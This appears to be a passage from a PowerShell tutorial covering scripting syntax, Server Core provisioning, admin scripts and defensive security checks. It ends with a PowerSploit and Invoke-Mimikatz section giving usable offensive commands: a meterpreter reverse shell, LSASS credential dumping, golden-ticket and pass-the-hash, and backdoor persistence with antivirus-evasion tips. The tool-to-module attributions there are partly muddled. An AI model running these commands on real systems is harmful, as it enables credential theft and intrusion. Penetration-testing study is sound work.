} else {
    Write-Output "The number is negative."
}
```
#### `If-ElseIf-Else` Statement
Allows for multiple conditions to be checked sequentially.
**Syntax:**
```powershell
if (<condition1>) {
    <code to execute if condition1 is true>
} elseif (<condition2>) {
    <code to execute if condition2 is true>
} else {
    <code to execute if none of the above conditions are true>
}
```
Example:
```powershell
# Check the range of a number
$number = 50
if ($number -lt 20) {
    Write-Output "The number is less than 20."
} elseif ($number -le 50) {
    Write-Output "The number is between 20 and 50."
} else {
    Write-Output "The number is greater than 50."
}
```
#### `Switch` Statement
Evaluates a variable against multiple values and executes the matching block of code.
**Syntax:**
```powershell
switch (<variable>) {
    <value1> { <code to execute for value1> }
    <value2> { <code to execute for value2> }
    default { <code to execute if no match is found> }
}
```
Example:
```powershell
# Respond to user input
$userInput = "Green"
switch ($userInput) {
    "Red" { Write-Output "Stop" }
    "Yellow" { Write-Output "Caution" }
    "Green" { Write-Output "Go" }
    default { Write-Output "Invalid input" }
}
```
#### Comparison Operators in Conditions
- **`-eq`**: Equal to
- **`-ne`**: Not equal to
- **`-gt`**: Greater than
- **`-lt`**: Less than
- **`-ge`**: Greater than or equal to
- **`-le`**: Less than or equal to
- **`-like`**: Matches a string pattern
- **`-notlike`**: Does not match a string pattern
#### Logical Operators
- **`-and`**: True if both conditions are true
- **`-or`**: True if at least one condition is true
- **`-not`** or `!`: Negates the condition

### Scripting Constructs in PowerShell
PowerShell offers a variety of scripting constructs to help write structured, reusable, and efficient scripts. These constructs include loops, conditional statements, functions, error handling, and more.
#### 1. Conditional Statements
#### 1.1. If-Else
Used to execute code blocks based on a condition.
```powershell
if ($Condition) {
    # Code to execute if condition is true
} elseif ($AnotherCondition) {
    # Code to execute if another condition is true
} else {
    # Code to execute if all conditions are false
}
```
Example:
```powershell
$Number = 10
if ($Number -gt 10) {
    Write-Host "Greater than 10"
} elseif ($Number -eq 10) {
    Write-Host "Equal to 10"
} else {
    Write-Host "Less than 10"
}
```
#### 1.2. Switch
Used to handle multiple possible values for a variable.
```powershell
switch ($Variable) {
    "Value1" { Write-Host "Matched Value1" }
    "Value2" { Write-Host "Matched Value2" }
    Default  { Write-Host "No match found" }
}
```
Example:
```powershell
$Day = "Monday"
switch ($Day) {
    "Monday" { Write-Host "Start of the work week" }
    "Friday" { Write-Host "End of the work week" }
    Default  { Write-Host "It's a regular day" }
}
```
#### 2. Loops
#### 2.1. For Loop
Executes a block of code a specific number of times.
```powershell
for ($i = 0; $i -lt 5; $i++) {
    Write-Host "Iteration $i"
}
```
#### 2.2. Foreach Loop
Iterates over each item in a collection.
```powershell
$Numbers = 1, 2, 3, 4, 5
foreach ($Number in $Numbers) {
    Write-Host "Number: $Number"
}
```
#### 2.3. While Loop
Executes a block of code as long as the condition is true
```powershell
$Count = 0
while ($Count -lt 5) {
    Write-Host "Count: $Count"
    $Count++
}
```
#### 2.4. Do-While Loop
Executes the block at least once, and then checks the condition.
```powershell
$Count = 0
do {
    Write-Host "Count: $Count"
    $Count++
} while ($Count -lt 5)
```
#### 2.5. Do-Until Loop
Executes the block at least once and stops when the condition becomes true.
```powershell
$Count = 0
do {
    Write-Host "Count: $Count"
    $Count++
} until ($Count -ge 5)
```
#### 3. Functions
Functions are reusable blocks of code that can take input, perform actions, and return output.
#### Defining a Function
```powershell
function FunctionName {
    Param (
        [Parameter(Mandatory)]
        [string]$Param1,
        [int]$Param2
    )
    # Code block
    Write-Host "Param1: $Param1, Param2: $Param2"
}
```
Calling a Function
```powershell
FunctionName -Param1 "Value1" -Param2 10
```
Return Values
```powershell
function Add-Numbers {
    Param ($Num1, $Num2)
    return $Num1 + $Num2
}
$result = Add-Numbers -Num1 5 -Num2 10
Write-Host "Result: $result"
```
#### 4. Arrays and HashTables
#### 4.1. Arrays
```powershell
# Define an array
$Array = @(1, 2, 3, 4, 5)

# Access an element
$Array[0]

# Iterate over an array
foreach ($Item in $Array) {
    Write-Host $Item
}
```
4.2. HashTables
```powershell
# Define a hashtable
$HashTable = @{
    Key1 = "Value1"
    Key2 = "Value2"
}

# Access a value
$HashTable["Key1"]

# Add a new key-value pair
$HashTable["Key3"] = "Value3"
```
#### 5. Pipelines
PowerShell uses the pipeline (`|`) to pass the output of one command as input to another.
**Example:**
```powershell
Get-Process | Where-Object { $_.CPU -gt 100 } | Select-Object -Property Name, CPU
```
#### 6. Try-Catch-Finally
Structured error handling ensures that scripts can gracefully handle exceptions.
```powershell
Try {
    # Code that might throw an error
    Get-Item "C:\NonExistentFile.txt"
} Catch {
    # Code to handle the error
    Write-Host "Error: $($_.Exception.Message)"
} Finally {
    # Code to run regardless of success or failure
    Write-Host "Cleanup actions"
}
```
#### 7. Script Blocks
A script block is a collection of statements enclosed in `{}`. They are reusable and can be stored in variables or passed as arguments.
```powershell
# Define a script block
$ScriptBlock = {
    Param ($Name)
    Write-Host "Hello, $Name!"
}

# Invoke the script block
& $ScriptBlock -Name "Alice"
```
#### 8. Workflow
Workflows allow parallel execution of tasks and are ideal for long-running operations.
```powershell
workflow Sample-Workflow {
    Parallel {
        Get-Process
        Get-Service
    }
}
Sample-Workflow
```
#### 9. Error Variables
- **`$Error`**: Contains a collection of the most recent errors.
- **`$?`**: Indicates whether the last command was successful (`True`/`False`).
```powershell
Get-Item "C:\NonExistentFile.txt"
if (-not $?) {
    Write-Host "Command failed"
}
```
#### 10. Dot Sourcing
Dot sourcing allows you to load functions or scripts into the current session.
```powershell
# Load a script into the current session
. C:\Scripts\MyScript.ps1
```
#### 11. Comments
Use comments to document scripts:
- **Single-line comment**: `# This is a comment`
- **Multi-line comment**:
```powershell
<#
This is a
multi-line comment.
#>
```
#### **Best Practices**
1. **Use Functions for Reusability**:
    - Break scripts into modular functions.
2. **Handle Errors Gracefully**:
    - Always include `Try-Catch` blocks for critical operations.
3. **Use Descriptive Variable Names**:
    - Improve readability with meaningful variable names.
4. **Comment Your Code**:
    - Explain complex logic or decisions with comments.
5. **Test Edge Cases**:
    - Ensure your script works in unexpected scenarios.


### Provisioning a New Server Core Instance with PowerShell
Provisioning a new **Server Core** instance involves configuring the server to meet your organization's needs, including networking, domain joining, feature installation, and more. Here's a comprehensive guide to provisioning a Server Core instance using PowerShell.
#### 1. Initial Configuration
#### 1.1 Set Administrator Password
When you first log in, ensure the administrator account has a strong password.
```powershell
# Change Administrator Password
net user Administrator NewPassword
```
#### 1.2 Rename the Server
Rename the server to match your naming convention.
```powershell
# Rename the server
Rename-Computer -NewName "ServerCore01" -Restart
```
#### 1.3 Configure Networking
Check and configure the network adapter.

- **View Network Configuration:**
```powershell
Get-NetIPAddress
```
Set a Static IP Address:
```powershell
New-NetIPAddress -InterfaceIndex 2 -IPAddress 192.168.1.10 -PrefixLength 24 -DefaultGateway 192.168.1.1
```
Set DNS Servers:
```powershell
Set-DnsClientServerAddress -InterfaceIndex 2 -ServerAddresses ("8.8.8.8", "8.8.4.4")
```
#### 2. Update the Server
#### 2.1 Check for Updates
Use `PSWindowsUpdate` to manage updates.
```powershell
# Install the Windows Update Module
Install-Module -Name PSWindowsUpdate -Force

# Check for updates
Get-WindowsUpdate

# Install updates
Install-WindowsUpdate -AcceptAll -IgnoreReboot
```
#### 3. Install Roles and Features
Use `Install-WindowsFeature` to install required roles and features.
#### 3.1 View Available Features
```powershell
Get-WindowsFeature
```
#### 3.2 Install a Role or Feature
Example: Install the Active Directory Domain Services (AD DS) role.
```powershell
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
```
3.3 Verify Installation
```powershell
Get-WindowsFeature -Name AD-Domain-Services
```
#### 4. Join a Domain
#### 4.1 Join the Server to a Domain
```powershell
Add-Computer -DomainName "example.com" -Credential (Get-Credential) -Restart
```
4.2 Verify Domain Membership
```powershell
Get-ComputerInfo | Select-Object CsName, Domain
```
#### 5. Configure Remote Management
Server Core does not have a GUI, so remote management is critical.
#### 5.1 Enable PowerShell Remoting
```powershell
Enable-PSRemoting -Force
```
5.2 Configure Remote Desktop
```powershell
# Enable Remote Desktop
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0

# Allow Remote Desktop in Firewall
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```
#### 6. Configure Firewall
#### 6.1 View Firewall Rules
```powershell
Get-NetFirewallRule | Where-Object { $_.Enabled -eq $true }
```
#### 6.2 Enable Specific Rules
Example: Allow file and printer sharing.
```powershell
Enable-NetFirewallRule -DisplayGroup "File and Printer Sharing"
```
#### 6.3 Disable Specific Rules
Example: Disable all inbound HTTP traffic.
```powershell
Disable-NetFirewallRule -DisplayName "World Wide Web Services (HTTP Traffic-In)"
```
#### 7. Configure Server Time
Ensure the server has the correct time and time zone.
#### 7.1 View Current Time Zone
```powershell
Get-TimeZone
```
7.2 Set Time Zone
```powershell
Set-TimeZone -Name "Eastern Standard Time"
```
7.3 Sync Time with an NTP Server
```powershell
w32tm /config /manualpeerlist:"time.windows.com" /syncfromflags:manual /reliable:YES /update
w32tm /resync
```
#### 8. Configure Scheduled Tasks
Automate recurring tasks using the `ScheduledTasks` module.
#### 8.1 Create a Task
Example: Run a script daily at 2 AM.
```powershell
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\Scripts\Backup.ps1"
$Trigger = New-ScheduledTaskTrigger -Daily -At 2AM
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "DailyBackup" -User "SYSTEM"
```
#### 9. Security Hardening
#### 9.1 Disable SMBv1
SMBv1 is a security risk and should be disabled.
```powershell
Disable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol"
```
9.2 Configure Windows Defender
```powershell
# Enable Real-Time Protection
Set-MpPreference -DisableRealtimeMonitoring $false

# Perform a Quick Scan
Start-MpScan -ScanType QuickScan
```
#### 10. Backup Configuration
#### 10.1 Install Windows Server Backup
```powershell
Install-WindowsFeature -Name Windows-Server-Backup
```
10.2 Schedule a Backup
```powershell
wbadmin enable backup -addtarget:\\Server\BackupShare -schedule:12:00 -systemstate -quiet
```
### Sample Script for Full Automation
Here's a script that automates common provisioning tasks
```powershell
# Set Server Name and Restart
Rename-Computer -NewName "ServerCore01" -Restart

# Wait for Restart
Start-Sleep -Seconds 60

# Configure Network
New-NetIPAddress -InterfaceIndex 2 -IPAddress 192.168.1.10 -PrefixLength 24 -DefaultGateway 192.168.1.1
Set-DnsClientServerAddress -InterfaceIndex 2 -ServerAddresses ("8.8.8.8", "8.8.4.4")

# Install Features
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Join Domain
Add-Computer -DomainName "example.com" -Credential (Get-Credential) -Restart

# Enable Remote Management
Enable-PSRemoting -Force
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Set Time Zone
Set-TimeZone -Name "Eastern Standard Time"

# Disable SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol"

# Install Updates
Install-Module -Name PSWindowsUpdate -Force
Install-WindowsUpdate -AcceptAll -IgnoreReboot
```
#### Verification Checklist
After provisioning, ensure the following:
1. **Network Configuration**: IP, DNS, and Gateway settings are correct.
2. **Domain Membership**: Confirm the server is joined to the domain.
3. **Roles and Features**: Verify that required roles and features are installed.
4. **Remote Management**: Test PowerShell remoting and Remote Desktop access.
5. **Security Settings**: Confirm firewall and Defender settings are as per organizational policies.

### Example Scripts for IT Professionals
#### Enforcing Desired State Configuration (DSC) Script
Desired State Configuration (DSC) is a declarative configuration management platform introduced by Microsoft. It is primarily used to automate the deployment and management of IT infrastructure, ensuring that systems are configured according to a desired state. DSC is built into Windows PowerShell and enables administrators to define the configuration of systems as code.
##### Core Concepts of Desired State Configuration
1. **Declarative Model:**
    - DSC uses a declarative syntax to describe the desired state of a system or application environment. The focus is on "what" needs to be configured, not "how" it is implemented.
2. **Configuration Documents:**
    - Configurations are defined in PowerShell scripts and stored as Managed Object Format (MOF) files. These files describe the desired state of a system.
3. **Push and Pull Models:**
    - **Push Model**: Administrators manually push the configuration to target nodes.
    - **Pull Model**: Target nodes periodically check in with a central server to pull their configuration.
4. **Resources:**
    - Resources are the building blocks of DSC. Each resource module specifies how to configure specific parts of the system, such as files, services, or registry settings.
    - Common examples include `File`, `Service`, `Registry`, and `Package`.
5. **Local Configuration Manager (LCM):**
    - The LCM is the DSC agent running on each node. It applies and monitors the desired state configuration, ensuring the system remains in compliance.
##### Workflow of DSC
1. **Author Configuration:**
    - Create a PowerShell script to define the desired state.
```powershell
Configuration ExampleConfig {
    Node "Server01" {
        WindowsFeature WebServer {
            Name = "Web-Server"
            Ensure = "Present"
        }
    }
}
ExampleConfi
```
1. - This script specifies that the `Web-Server` feature should be present on `Server01`.
2. **Generate MOF File:**
    - Compile the configuration script to produce an MOF file for the target node.
3. **Apply Configuration:**
    - Use the Push or Pull model to apply the configuration to the node.
4. **Monitor State:**
    - The LCM ensures the node stays in the desired state. If changes are detected, the LCM can reapply the configuration,
##### DSC in Action
DSC is widely used in scenarios like:
- Automating server deployments.
- Enforcing security baselines.
- Configuring applications.
- Ensuring compliance with organizational standards.
##### Example DSC Script
```powershell
# Create a DSC Configuration Script
Configuration ExampleConfig {
    Node "localhost" {
        File ExampleFile {
            DestinationPath = "C:\Temp\example.txt"
            Contents = "Hello, World!"
            Ensure = "Present"
        }
    }
}

# Compile and apply the configuration
ExampleConfig
Start-DscConfiguration -Path .\ExampleConfig -Wait -Verbose
```
#### Monitor a Web Page for Changes
Periodically Check a Web Page
```powershell
# URL to monitor
$url = "https://example.com"

# Previous content hash
$previousHash = ""

# Monitor loop
while ($true) {
    $currentHash = (Invoke-WebRequest -Uri $url).Content | Get-FileHash -Algorithm MD5 | Select-Object -ExpandProperty Hash
    if ($currentHash -ne $previousHash) {
        Write-Host "Web page changed!"
        $previousHash = $currentHash
    }
    Start-Sleep -Seconds 60
}
```
#### Check Disk Space
This script checks all drives on the computer and reports if any drive is below a specific free space threshold.
```powershell
# Check Disk Space
$Threshold = 20GB
Get-PSDrive -PSProvider FileSystem | ForEach-Object {
    $FreeSpace = $_.Free / 1GB
    if ($FreeSpace -lt $Threshold) {
        Write-Warning "$($_.Name): Only $([math]::Round($FreeSpace, 2)) GB free."
    } else {
        Write-Host "$($_.Name): $([math]::Round($FreeSpace, 2)) GB free."
    }
}
```
#### Automate User Creation in Active Directory
This script creates a new Active Directory user and sets an initial password.
```powershell
# Import Active Directory Module
Import-Module ActiveDirectory

# Variables for New User
$FirstName = "John"
$LastName = "Doe"
$UserName = "$FirstName.$LastName"
$Password = "Pa$$w0rd123"

# Create User
New-ADUser -Name "$FirstName $LastName" `
    -GivenName $FirstName `
    -Surname $LastName `
    -SamAccountName $UserName `
    -UserPrincipalName "$UserName@domain.com" `
    -AccountPassword (ConvertTo-SecureString $Password -AsPlainText -Force) `
    -Enabled $true
```
#### Backup Event Logs
This script exports all Windows event logs to a backup folder.
```powershell
# Export Windows Event Logs
$BackupPath = "C:\LogsBackup"
if (!(Test-Path $BackupPath)) {
    New-Item -ItemType Directory -Path $BackupPath
}
Get-WinEvent -LogName * | ForEach-Object {
    $LogName = $_.LogName
    $FilePath = Join-Path -Path $BackupPath -ChildPath "$LogName.evtx"
    Write-Host "Backing up $LogName..."
    wevtutil epl $LogName $FilePath
}
```
#### Monitor Service Status
This script checks if a specified service is running and restarts it if it’s stopped.
```powershell
# Monitor and Restart Service
$ServiceName = "wuauserv" # Windows Update Service
$Service = Get-Service -Name $ServiceName
if ($Service.Status -ne "Running") {
    Write-Warning "$ServiceName is not running. Restarting..."
    Start-Service -Name $ServiceName
} else {
    Write-Host "$ServiceName is running."
}
```
#### Clear Old Files
This script deletes files older than a specified number of days from a folder.
```powershell
# Clear Old Files
$FolderPath = "C:\Temp"
$DaysOld = 30
Get-ChildItem -Path $FolderPath -Recurse | Where-Object {
    $_.LastWriteTime -lt (Get-Date).AddDays(-$DaysOld)
} | Remove-Item -Force -Verbose
```
#### Export Installed Software List
This script retrieves a list of all installed programs and saves it to a CSV file.
```powershell
# Export Installed Software
$OutputFile = "C:\InstalledSoftware.csv"
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,
                  HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Export-Csv -Path $OutputFile -NoTypeInformation -Force
Write-Host "Installed software list exported to $OutputFile."
```
#### Reset User Password
This script resets a password for an Active Directory user.
```powershell
# Reset Active Directory User Password
Import-Module ActiveDirectory
$UserName = "johndoe"
$NewPassword = "NewPa$$w0rd123"
Set-ADAccountPassword -Identity $UserName -Reset -NewPassword (ConvertTo-SecureString $NewPassword -AsPlainText -Force)
Write-Host "Password reset for $UserName."
```
#### Check for Pending Windows Updates
This script lists all pending Windows updates.
```powershell
# Check for Pending Updates
Import-Module PSWindowsUpdate
Get-WindowsUpdate | Format-Table -AutoSize
```
#### Schedule a Task
This script creates a scheduled task to run a specified script daily.
```powershell
# Schedule Task
$TaskName = "DailyBackup"
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\Scripts\BackupScript.ps1"
$Trigger = New-ScheduledTaskTrigger -Daily -At 2AM
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal
Write-Host "Scheduled task '$TaskName' created."
```
### Example Scripts for Cyber Security
Here are some **PowerShell scripts tailored for cybersecurity professionals**, designed to perform tasks such as log analysis, vulnerability scanning, and incident response.
#### Scan for Open Ports on a Machine
This script scans for open TCP ports on a target machine.
```powershell
# Scan Open Ports
$Target = "192.168.1.100"
$Ports = 1..1024
$OpenPorts = @()

foreach ($Port in $Ports) {
    $Connection = Test-NetConnection -ComputerName $Target -Port $Port -WarningAction SilentlyContinue
    if ($Connection.TcpTestSucceeded) {
        $OpenPorts += $Port
    }
}

Write-Host "Open Ports on $Target: $($OpenPorts -join ', ')"
```
#### Check File Integrity
This script checks the integrity of a file by comparing its hash to a known value.
```powershell
# Check File Integrity
$FilePath = "C:\Path\To\File.exe"
$KnownHash = "abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"

$FileHash = Get-FileHash -Path $FilePath -Algorithm SHA256
if ($FileHash.Hash -eq $KnownHash) {
    Write-Host "File integrity check passed."
} else {
    Write-Warning "File integrity check failed!"
}
```
#### Search for Malicious Processes
This script searches for suspicious processes by comparing against a known bad process list.
```powershell
# Search for Malicious Processes
$KnownBadProcesses = @("malware.exe", "cryptominer.exe", "keylogger.exe")
$RunningProcesses = Get-Process | Select-Object -ExpandProperty ProcessName

$SuspiciousProcesses = $RunningProcesses | Where-Object { $_ -in $KnownBadProcesses }

if ($SuspiciousProcesses) {
    Write-Warning "Suspicious processes found: $($SuspiciousProcesses -join ', ')"
} else {
    Write-Host "No suspicious processes found."
}
```
#### Monitor Unauthorized Login Attempts
This script checks the Security Event Log for failed login attempts.
```powershell
# Monitor Failed Login Attempts
Get-EventLog -LogName Security -EntryType FailureAudit -InstanceId 4625 -Newest 50 |
    Select-Object TimeGenerated, Message |
    Format-Table -AutoSize
```
#### Block Malicious IP Addresses
This script adds a list of malicious IP addresses to the Windows Firewall.
```powershell
# Block Malicious IPs
$MaliciousIPs = @("192.168.1.200", "203.0.113.50")
foreach ($IP in $MaliciousIPs) {
    New-NetFirewallRule -DisplayName "Block $IP" -Direction Inbound -Action Block -RemoteAddress $IP
}
Write-Host "Blocked IP addresses: $($MaliciousIPs -join ', ')"
```
#### Detect Hidden Files
This script scans a directory for hidden files and outputs their details.
```powershell
# Detect Hidden Files
$Directory = "C:\SuspiciousFolder"
Get-ChildItem -Path $Directory -Force | Where-Object { $_.Attributes -match "Hidden" } |
    Select-Object FullName, Attributes, LastWriteTime |
    Format-Table -AutoSize
```
#### Retrieve Suspicious Network Connections
This script lists active TCP connections and flags connections to suspicious IPs.
```powershell
# Retrieve Suspicious Network Connections
$KnownSuspiciousIPs = @("192.168.1.250", "10.0.0.50")
$Connections = Get-NetTCPConnection | Where-Object { $_.RemoteAddress -in $KnownSuspiciousIPs }

if ($Connections) {
    Write-Warning "Suspicious connections found:"
    $Connections | Format-Table -Property LocalAddress, LocalPort, RemoteAddress, RemotePort
} else {
    Write-Host "No suspicious connections found."
}
```
#### Audit Installed Software
This script audits installed software for known vulnerable versions.
```powershell
# Audit Installed Software
$VulnerableSoftware = @(
    @{ Name = "Adobe Acrobat"; Version = "2020.009.20074" },
    @{ Name = "Java"; Version = "8.0.2910.10" }
)

$InstalledSoftware = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,
                                       HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
                      Select-Object DisplayName, DisplayVersion

foreach ($Vuln in $VulnerableSoftware) {
    $Match = $InstalledSoftware | Where-Object {
        $_.DisplayName -eq $Vuln.Name -and $_.DisplayVersion -eq $Vuln.Version
    }
    if ($Match) {
        Write-Warning "Vulnerable software detected: $($Vuln.Name) $($Vuln.Version)"
    }
}
```
#### Export Security Logs
This script exports security event logs for forensic analysis.
```powershell
# Export Security Logs
$OutputPath = "C:\Logs\SecurityLogs.evtx"
wevtutil epl Security $OutputPath
Write-Host "Security logs exported to $OutputPath."
```
#### Check for Privilege Escalation Attempts
This script scans for Event ID 4672 (special privileges assigned) in the Security Event Log.
```powershell
# Check for Privilege Escalation Attempts
Get-EventLog -LogName Security -InstanceId 4672 -Newest 50 |
    Select-Object TimeGenerated, Message |
    Format-Table -AutoSize
```
#### Detect Anomalous Scheduled Tasks
This script identifies suspicious scheduled tasks.
```powershell
# Detect Suspicious Scheduled Tasks
$ScheduledTasks = Get-ScheduledTask | Where-Object { $_.State -eq "Running" -or $_.Principal.UserId -eq "SYSTEM" }
$SuspiciousTasks = $ScheduledTasks | Where-Object { $_.Actions.Exec.Command -match "powershell|cmd" }

if ($SuspiciousTasks) {
    Write-Warning "Suspicious scheduled tasks found:"
    $SuspiciousTasks | Format-Table -Property TaskName, State, Actions
} else {
    Write-Host "No suspicious tasks found."
}
```
#### Find Recent PowerShell Command History
This script extracts recent PowerShell command history for auditing.
```powershell
# Retrieve PowerShell Command History
$HistoryPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $HistoryPath) {
    Get-Content $HistoryPath | Select-Object -Last 20
} else {
    Write-Host "No PowerShell command history found."
}
```
### Common Powershell Tools in Cyber Security
#### Powersploit
**PowerSploit** is a collection of PowerShell scripts designed for penetration testing and offensive security. It leverages PowerShell’s capabilities to perform various tasks such as exploitation, post-exploitation, privilege escalation, and more. PowerSploit is often used by security professionals to test the resilience of systems and networks against attacks.
#### Modules in PowerSploit
PowerSploit is modular, with scripts organized into categories based on their functionality.
##### 1. CodeExecution
Scripts for executing arbitrary code on a target system.
- **Example Scripts**:
    - `Invoke-ReflectivePEInjection`: Injects a Portable Executable (PE) file into the memory of a process.
    - `Invoke-Shellcode`: Executes shellcode in memory.
- **Use Case**: Injecting payloads without writing to disk to avoid detection.
##### 2. Persistence
Tools to establish and maintain persistence on a compromised system.
- **Example Scripts**:
    - `Invoke-BackdoorLNK`: Creates a malicious shortcut (.lnk) file for persistence.
    - `New-UserPersistenceOption`: Adds registry keys or scheduled tasks for persistence.
- **Use Case**: Setting up mechanisms to ensure continued access after reboot or user activity.
##### 3. Privesc (Privilege Escalation)
Scripts for escalating privileges on a compromised system.
- **Example Scripts**:
    - `PowerUp`: Audits and exploits common privilege escalation vulnerabilities on Windows.
    - `Get-ServicePerms`: Identifies misconfigured services that could allow privilege escalation.
- **Use Case**: Identifying and exploiting weaknesses to elevate permissions.
##### 4. Recon
Scripts for gathering information about the target environment.
- **Example Scripts**:
    - `Invoke-Recon`: Collects detailed information about the network, users, and systems.
    - `Get-NetUser`: Retrieves user account details.
- **Use Case**: Performing reconnaissance on the target to identify attack vectors.
##### 5. AntivirusBypass
Techniques to evade antivirus detection.
- **Example Scripts**:
    - `Out-EncryptedScript`: Obfuscates scripts to bypass detection.
    - `Invoke-Obfuscation`: Automates the obfuscation of PowerShell scripts.
- **Use Case**: Avoiding detection by security software during exploitation or post-exploitation.
##### 6. Exfiltration
Scripts for extracting data from a compromised system.
- **Example Scripts**:
    - `Invoke-Mimikatz`: Extracts credentials from memory.
    - `Invoke-CredentialPhish`: Sets up a phishing attack to steal credentials.
- **Use Case**: Collecting sensitive information such as passwords, keys, or tokens.
##### 7. Post-Exploitation
Tools for maintaining access and extracting further information.
- **Example Scripts**:
    - `Invoke-Kerberoast`: Exploits Kerberos tickets to extract password hashes.
    - `Get-RegistryAutoRun`: Retrieves registry entries that run on startup.
- **Use Case**: Expanding control over a system or network after initial compromise.
    
#### How PowerSploit Works
PowerSploit scripts utilize PowerShell’s capabilities to interact with the operating system at a deep level. Key techniques include:
1. **Reflective DLL Injection**:
    - Loading malicious code into memory without writing to disk.
2. **Living Off the Land (LOTL)**:
    - Using built-in Windows utilities (like PowerShell) to avoid detection.
3. **Memory Manipulation**:
    - Executing code directly in memory to evade traditional antivirus software.
4. **Automation**:
    - Automating reconnaissance, exploitation, and data exfiltration tasks.

#### Example Usage of PowerSploit
##### 1. Shellcode Execution
Execute shellcode directly in memory using `Invoke-Shellcode`.
```powershell
Import-Module .\CodeExecution\Invoke-Shellcode.ps1
Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 192.168.1.100 -Lport 4444 -Force
```
##### 2. Privilege Escalation with PowerUp
Identify misconfigurations that allow privilege escalation.
```powershell
Import-Module .\Privesc\PowerUp.ps1
Invoke-AllChecks
```
##### 3. Extracting Credentials with Invoke-Mimikatz
Retrieve plaintext passwords from memory.
```powershell
Import-Module .\Exfiltration\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
```
##### 4. Persistent Backdoor
Create a malicious shortcut that persists after reboot.
```powershell
Import-Module .\Persistence\Invoke-BackdoorLNK.ps1
Invoke-BackdoorLNK -PayloadPath "C:\Windows\Temp\backdoor.ps1" -LNKPath "C:\Users\Public\Startup\backdoor.lnk"
```
##### 5. Reconnaissance
Gather information about the environment.
```powershell
Import-Module .\Recon\Invoke-Recon.ps1
Invoke-Recon
```
#### Invoke-Mimikatz
`Invoke-Mimikatz` is a PowerShell script that integrates the powerful credential-dumping capabilities of the **Mimikatz** tool into a PowerShell environment. It is widely used in penetration testing and red teaming exercises to extract sensitive credentials from Windows systems.
##### What is Mimikatz?
Mimikatz is an open-source post-exploitation tool created by Benjamin Delpy. It is famous for its ability to extract plaintext passwords, hashes, PINs, and Kerberos tickets from memory. `Invoke-Mimikatz` leverages Mimikatz’s DLLs or executable capabilities and provides a PowerShell interface to execute its commands.
##### Capabilities of Invoke-Mimikatz
With `Invoke-Mimikatz`, you can perform the following tasks:

1. **Dump Credentials**:
    - Extract plaintext passwords and hashes from LSASS (Local Security Authority Subsystem Service) memory.
2. **Pass-the-Hash**:
    - Authenticate to resources using NTLM hashes without knowing the plaintext password.
3. **Golden and Silver Tickets**:
    - Generate Kerberos tickets for persistence or lateral movement.
4. **Export and Use Certificates**:
    - Export and use certificates for authentication.
5. **LSA Secrets**:
    - Extract secrets stored in the Local Security Authority.
6. **Dump Kerberos Tickets**:
    - Retrieve Kerberos tickets for further use.

##### Using Invoke-Mimikatz
**1. Importing the Script**
You need to import `Invoke-Mimikatz.ps1` into your PowerShell session.
```powershell
Import-Module .\Invoke-Mimikatz.ps1
```
**2. Running Invoke-Mimikatz**
Run `Invoke-Mimikatz` with specific commands to execute Mimikatz functions.
```powershell
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
```
**3. Specifying Commands**
Commands passed to `Invoke-Mimikatz` correspond to standard Mimikatz commands. Here are some examples:
- **Dump Logon Credentials**:
```powershell
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
```
**Dump Kerberos Tickets**:
```powershell
Invoke-Mimikatz -Command "sekurlsa::tickets"
```
**Dump NTLM Hashes**:
```powershell
Invoke-Mimikatz -Command "lsadump::sam"
```
**Generate a Golden Ticket**:
```powershell
Invoke-Mimikatz -Command "kerberos::golden /domain:example.com /sid:S-1-5-21-1234567890 /krbtgt:HASH /user:Administrator"
```
**Pass-the-Hash**:
```powershell
Invoke-Mimikatz -Command "sekurlsa::pth /user:Administrator /domain:example.com /ntlm:HASH /run:cmd.exe"
```
##### Understanding the Output
The output of `Invoke-Mimikatz` is typically verbose and includes:
- **Logon Sessions**:
    - List of logged-in users and their credentials (plaintext passwords, NTLM hashes, etc.).
- **Kerberos Tickets**:
    - Extracted Kerberos tickets for replay attacks.
- **LSA Secrets**:
    - Hidden credentials stored in the Local Security Authority.

##### Examples
**Example 1: Extract Logon Passwords**
```powershell
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
```
- **Purpose**: Retrieves plaintext passwords and NTLM hashes for users currently logged into the system.
**Example 2: Dump NTLM Hashes**
```powershell
Invoke-Mimikatz -Command "lsadump::sam"
```
- **Purpose**: Extracts NTLM password hashes from the SAM (Security Account Manager) database.
**Example 3: Export Kerberos Tickets**
```powershell
Invoke-Mimikatz -Command "sekurlsa::tickets /export"
```
**Purpose**: Dumps all Kerberos tickets and saves them as files for later use.

##### Execution Methods
There are different ways to run `Invoke-Mimikatz`:
1. **In-Memory Execution**:
    - Load `Invoke-Mimikatz.ps1` into memory without touching the disk.
    - Common in red teaming to avoid antivirus detection.
2. **Disk Execution**:
    - Save the script to disk and execute it.
    - More likely to trigger antivirus alerts.

#### Nishang
